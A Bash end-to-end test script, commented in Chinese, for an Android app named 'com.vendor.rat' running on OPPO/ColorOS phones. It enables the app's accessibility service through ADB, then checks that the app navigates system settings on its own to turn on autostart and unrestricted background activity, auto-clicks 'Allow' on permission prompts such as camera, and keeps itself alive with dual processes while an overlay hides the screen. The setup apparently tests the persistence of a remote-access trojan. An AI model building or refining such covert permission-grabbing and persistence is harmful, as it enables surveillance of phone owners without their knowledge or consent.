#!/bin/bash
#
# OPPO/ColorOS 真机 E2E 自动化测试
#
# 用法:
#   ./scripts/e2e_oppo_test.sh <device_address>
#   ./scripts/e2e_oppo_test.sh <device_address> --skip-build
#
# 示例:
#   ./scripts/e2e_oppo_test.sh 192.168.31.249:5555
#   ./scripts/e2e_oppo_test.sh 192.168.31.249:5555 --skip-build
#
# OppoEngine 自动化流程 (对应 vendor o/v.java):
#   1. Pipeline 打开应用详情页 (InstalledAppDetailsTop) → 触发 OppoEngine
#   2. case 0 (keepAliveInAppDetail): 滚动查找"电池"/"耗电管理" → 点击进入
#   3. case 1 (keepAliveInPowerControl): 自启动/关联启动/完全允许后台 三个开关
#   4. case 2 (keepAliveInAndroidXDialog): 对话框 → 点击允许
#   5. case 3 (keepAliveInStartup): 自启动管理 → 开启自启动
#   6. 完成后 → 双进程保活(backup) → finish() → 移除遮罩
#
# OPPO 特有 Activity:
#   - com.android.settings / InstalledAppDetailsTop (应用详情)
#   - com.oplus.battery / PowerControlActivity (耗电管理)
#   - com.oplus.battery / StartupAppListActivity (自启动管理)
#   - com.coloros.oppoguardelf / PowerControlActivity (旧版 ColorOS)

set -euo pipefail

# ============ 配置 ============

ADB="/mnt/c/Users/Administrator/Downloads/platform-tools/adb.exe"
PKG="com.vendor.rat"
A11Y_SERVICE="$PKG/com.vendor.rat.service.MyAccessibilityService"
APK="app/build/outputs/apk/debug/app-debug.apk"
MAIN_ACTIVITY="$PKG/.activity.ActivMain"
TIMEOUT=120       # 自动化等待超时 (秒)
POLL_INTERVAL=3   # 轮询间隔 (秒)

# OPPO 特有
SETTINGS="com.android.settings"
APP_DETAIL_ACTIVITY="$SETTINGS/.applications.InstalledAppDetailsTop"
OPLUS_BATTERY="com.oplus.battery"
POWER_CONTROL_ACTIVITY="$OPLUS_BATTERY/com.oplus.powermanager.fuelgaue.PowerControlActivity"

# 颜色
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# 计数
PASS_COUNT=0
FAIL_COUNT=0
TOTAL_COUNT=0

# ============ 工具函数 ============

adb_cmd() {
    "$ADB" -s "$DEVICE" "$@" 2>&1
}

log_info() {
    echo -e "${CYAN}[INFO]${NC} $1"
}

log_pass() {
    TOTAL_COUNT=$((TOTAL_COUNT + 1))
    PASS_COUNT=$((PASS_COUNT + 1))
    printf "${GREEN}[✓]${NC} %-28s ${GREEN}PASS${NC}" "$1"
    [ -n "${2:-}" ] && printf " (%s)" "$2"
    echo
}

log_fail() {
    TOTAL_COUNT=$((TOTAL_COUNT + 1))
    FAIL_COUNT=$((FAIL_COUNT + 1))
    printf "${RED}[✗]${NC} %-28s ${RED}FAIL${NC}" "$1"
    [ -n "${2:-}" ] && printf " — %s" "$2"
    echo
}

log_warn() {
    printf "${YELLOW}[!]${NC} %-28s ${YELLOW}WARN${NC}" "$1"
    [ -n "${2:-}" ] && printf " — %s" "$2"
    echo
}

get_pid() {
    adb_cmd shell pidof "$PKG" | tr -d '\r\n'
}

# 获取 PID 过滤后的应用日志 (排除噪声)
get_app_logs() {
    local pid="$1"
    adb_cmd logcat -d | grep "$pid" | grep -vE "chromium|CORB|url_loader|DidRead blocked|nativeloader|CompatChangeReporter"
}

# ============ 参数解析 ============

DEVICE="${1:-}"
SKIP_BUILD=false

if [ -z "$DEVICE" ]; then
    echo "用法: $0 <device_address> [--skip-build]"
    echo "示例: $0 192.168.31.249:5555"
    exit 1
fi

for arg in "${@:2}"; do
    case "$arg" in
        --skip-build) SKIP_BUILD=true ;;
    esac
done

# ============ 阶段 1: 准备 ============

echo
echo "============================================"
echo "  OPPO/ColorOS E2E 自动化测试"
echo "  设备: $DEVICE"
echo "============================================"
echo

log_info "连接设备..."
adb_cmd connect "$DEVICE" > /dev/null 2>&1 || true
sleep 1

# 验证连接
if ! adb_cmd shell echo "ok" | grep -q "ok"; then
    echo -e "${RED}设备连接失败: $DEVICE${NC}"
    exit 1
fi

# 获取设备信息
MODEL=$(adb_cmd shell getprop ro.product.model | tr -d '\r\n')
SDK=$(adb_cmd shell getprop ro.build.version.sdk | tr -d '\r\n')
COLOROS=$(adb_cmd shell getprop ro.build.display.id | tr -d '\r\n')
BRAND=$(adb_cmd shell getprop ro.product.brand | tr -d '\r\n')
log_info "设备: $MODEL ($BRAND) | SDK $SDK | $COLOROS"

# 卸载旧版本
log_info "卸载旧版本..."
adb_cmd uninstall "$PKG" > /dev/null 2>&1 || true
sleep 1

# ============ 阶段 2: 构建安装 ============

BUILD_START=$(date +%s)

if [ "$SKIP_BUILD" = true ]; then
    log_info "跳过构建 (--skip-build)"
else
    log_info "构建 Debug APK..."
    if ! ./gradlew assembleDebug -q 2>&1; then
        log_fail "构建 APK" "gradlew assembleDebug 失败"
        exit 1
    fi
fi

if [ ! -f "$APK" ]; then
    log_fail "构建安装" "APK 不存在: $APK"
    exit 1
fi

log_info "安装 APK..."
INSTALL_RESULT=$(adb_cmd install -r "$APK")
BUILD_END=$(date +%s)
BUILD_DURATION=$((BUILD_END - BUILD_START))

if echo "$INSTALL_RESULT" | grep -q "Success"; then
    log_pass "构建安装" "${BUILD_DURATION}s"
else
    log_fail "构建安装" "$INSTALL_RESULT"
    exit 1
fi

# ============ 阶段 3: 启动 + 授权 ============

# 清空 logcat
adb_cmd logcat -c > /dev/null 2>&1

log_info "启动应用..."
adb_cmd shell am start -n "$MAIN_ACTIVITY" > /dev/null 2>&1
sleep 3

log_info "通过 ADB 启用无障碍服务..."
adb_cmd shell settings put secure enabled_accessibility_services "$A11Y_SERVICE" > /dev/null
adb_cmd shell settings put secure accessibility_enabled 1 > /dev/null
sleep 2

# 验证无障碍
A11Y_CHECK=$(adb_cmd shell settings get secure enabled_accessibility_services | tr -d '\r\n')
if echo "$A11Y_CHECK" | grep -q "$PKG"; then
    log_pass "无障碍启用"
else
    log_fail "无障碍启用" "当前值: $A11Y_CHECK"
    exit 1
fi

# 等待引擎注册 + Pipeline 自动触发
log_info "等待 Pipeline 自动触发 (OppoEngine 注册 + 遮罩显示 + 打开应用详情)..."
sleep 5

PID=$(get_pid)
if [ -z "$PID" ]; then
    log_fail "应用启动" "进程未找到"
    exit 1
fi
log_info "应用 PID: $PID"

# ============ 阶段 4: 等待自动化完成 ============

log_info "等待自动化执行 (最长 ${TIMEOUT}s)..."

ELAPSED=0
AUTO_DONE=false
SNAPSHOT_LOGS=""

while [ $ELAPSED -lt $TIMEOUT ]; do
    sleep $POLL_INTERVAL
    ELAPSED=$((ELAPSED + POLL_INTERVAL))

    # 检查进程是否存活
    CURRENT_PID=$(get_pid)
    if [ -z "$CURRENT_PID" ]; then
        log_info "进程已退出，等待重启..."
        sleep 3
        PID=$(get_pid)
        if [ -z "$PID" ]; then
            continue
        fi
    fi

    # 累积保存日志快照
    SNAPSHOT_LOGS=$(get_app_logs "$PID" 2>/dev/null || true)

    # 检查是否完成 — 等待 Pipeline END (不仅是引擎完成)
    if echo "$SNAPSHOT_LOGS" | grep -qE "Pipeline END"; then
        AUTO_DONE=true
        log_info "Pipeline 已完成 (${ELAPSED}s)"
        break
    fi

    # 显示进度
    PROGRESS=""
    if echo "$SNAPSHOT_LOGS" | grep -q "keepAliveInAppDetail 窗口匹配"; then
        PROGRESS="App详情处理中..."
    fi
    if echo "$SNAPSHOT_LOGS" | grep -q "查找并点击耗电管理栏目成功"; then
        PROGRESS="已进入耗电管理"
    fi
    if echo "$SNAPSHOT_LOGS" | grep -q "已点击允许自启动"; then
        PROGRESS="自启动处理中..."
    fi
    if echo "$SNAPSHOT_LOGS" | grep -q "已勾选完全允许后台行为"; then
        PROGRESS="完全后台已开启"
    fi
    if echo "$SNAPSHOT_LOGS" | grep -q "准备结束"; then
        PROGRESS="引擎准备结束..."
    fi
    [ -n "$PROGRESS" ] && log_info "进度: $PROGRESS (${ELAPSED}s)"
done

# 等待遮罩移除和权限弹窗处理
sleep 10

if ! $AUTO_DONE; then
    log_fail "自动化执行" "超时 ${TIMEOUT}s"
fi

# ============ 阶段 5: 验证结果 ============

echo
log_info "开始验证..."
echo

# 合并日志
PID=$(get_pid)
if [ -z "$PID" ]; then
    PID="${CURRENT_PID:-}"
fi
FINAL_LOGS=""
if [ -n "$PID" ]; then
    FINAL_LOGS=$(get_app_logs "$PID" 2>/dev/null || true)
fi
ALL_LOGS=$(printf "%s\n%s" "$SNAPSHOT_LOGS" "$FINAL_LOGS" | sort -u)

# --- 验证 1: Pipeline 触发 ---
if echo "$ALL_LOGS" | grep -q "Pipeline START"; then
    log_pass "Pipeline 触发"
elif echo "$ALL_LOGS" | grep -qE "Pipeline: >>>|触发自动化管道"; then
    log_pass "Pipeline 触发" "Pipeline 日志"
else
    log_fail "Pipeline 触发" "未找到管道启动日志"
fi

# --- 验证 2: 应用详情页进入 ---
if echo "$ALL_LOGS" | grep -q "keepAliveInAppDetail 窗口匹配"; then
    log_pass "应用详情页进入"
elif echo "$ALL_LOGS" | grep -q "启动 OPPO 应用详情页成功"; then
    log_pass "应用详情页进入" "启动成功"
else
    log_fail "应用详情页进入" "未检测到 App 详情窗口"
fi

# --- 验证 3: 耗电管理 ---
if echo "$ALL_LOGS" | grep -q "查找并点击耗电管理栏目成功"; then
    log_pass "耗电管理进入"
elif echo "$ALL_LOGS" | grep -q "keepAliveInPowerControl 窗口匹配"; then
    log_pass "耗电管理进入" "窗口匹配"
else
    log_fail "耗电管理进入" "未找到耗电管理日志"
fi

# --- 验证 4: 完全允许后台 ---
if echo "$ALL_LOGS" | grep -q "已勾选完全允许后台行为"; then
    log_pass "完全允许后台"
elif echo "$ALL_LOGS" | grep -qE "已点击完全允许后台行为|RadioButton 已选中|RadioButton 模式.*假设成功|已点击确认对话框"; then
    log_pass "完全允许后台" "RadioButton 模式"
elif echo "$ALL_LOGS" | grep -q "完全允许后台行为栏目查找成功"; then
    log_pass "完全允许后台" "栏目已找到"
else
    log_fail "完全允许后台" "未找到后台权限日志"
fi

# --- 验证 5: 自启动 ---
if echo "$ALL_LOGS" | grep -q "已勾选允许自启动"; then
    log_pass "允许自启动"
elif echo "$ALL_LOGS" | grep -q "已点击允许自启动"; then
    log_pass "允许自启动" "已点击"
elif [ "$SDK" -ge 36 ] && echo "$ALL_LOGS" | grep -qE "允许自启动栏目不存在|ColorOS 16 可能已移除"; then
    log_warn "允许自启动" "ColorOS 16 已移除此选项"
else
    log_fail "允许自启动" "未找到自启动日志"
fi

# --- 验证 6: 引擎完成 ---
if echo "$ALL_LOGS" | grep -qE "已结束本地保活自动化引擎|已结束自动化引擎"; then
    log_pass "引擎完成"
elif echo "$ALL_LOGS" | grep -q "准备结束"; then
    log_pass "引擎完成" "正在结束中"
else
    log_fail "引擎完成" "未找到引擎完成日志"
fi

# --- 验证 7: 权限自动授权 ---
if echo "$ALL_LOGS" | grep -qE "Clicked.*允许|Clicked.*Allow|Clicked allow button|已选择'|权限管理: 已授权|坐标点击.*成功|开始权限管理自动化"; then
    log_pass "权限自动授权"
else
    CAMERA_GRANTED=$(adb_cmd shell dumpsys package "$PKG" | grep "android.permission.CAMERA" | grep "granted=true" || true)
    if [ -n "$CAMERA_GRANTED" ]; then
        log_pass "权限自动授权" "dumpsys 确认"
    else
        log_fail "权限自动授权" "未找到授权日志"
    fi
fi

# --- 验证 8: 遮罩已关闭 ---
if echo "$ALL_LOGS" | grep -q "BlockTextView 已从窗口移除"; then
    log_pass "遮罩已关闭"
elif echo "$ALL_LOGS" | grep -qE "已结束本地保活自动化引擎|已结束自动化引擎"; then
    log_pass "遮罩已关闭" "引擎结束隐含"
else
    log_fail "遮罩已关闭" "未找到遮罩移除日志"
fi

# --- 验证 9: 返回应用页面 ---
FOREGROUND=$(adb_cmd shell "dumpsys activity activities 2>/dev/null | grep -E 'mResumedActivity|mFocusedActivity'" | head -1 | tr -d '\r\n' || true)
if echo "$FOREGROUND" | grep -q "$PKG"; then
    log_pass "返回应用页面"
else
    TOP_ACTIVITY=$(adb_cmd shell "dumpsys activity top 2>/dev/null | grep ACTIVITY" | tail -1 | tr -d '\r\n' || true)
    if echo "$TOP_ACTIVITY" | grep -q "$PKG"; then
        log_pass "返回应用页面" "top activity"
    else
        log_fail "返回应用页面" "前台: $FOREGROUND"
    fi
fi

# ============ 汇总 ============

echo
echo "============================================"
echo -e "  ${MODEL} (${BRAND}) | SDK ${SDK} | ${COLOROS}"
echo "============================================"
if [ $FAIL_COUNT -eq 0 ]; then
    echo -e "  结果: ${GREEN}${PASS_COUNT}/${TOTAL_COUNT} PASS${NC}"
else
    echo -e "  结果: ${RED}${PASS_COUNT}/${TOTAL_COUNT} PASS, ${FAIL_COUNT} FAIL${NC}"
fi
echo "============================================"
echo

# 保存日志快照
LOG_FILE="/tmp/e2e_oppo_${DEVICE%%:*}_$(date +%Y%m%d_%H%M%S).log"
echo "$ALL_LOGS" > "$LOG_FILE"
log_info "日志已保存: $LOG_FILE"

exit $FAIL_COUNT
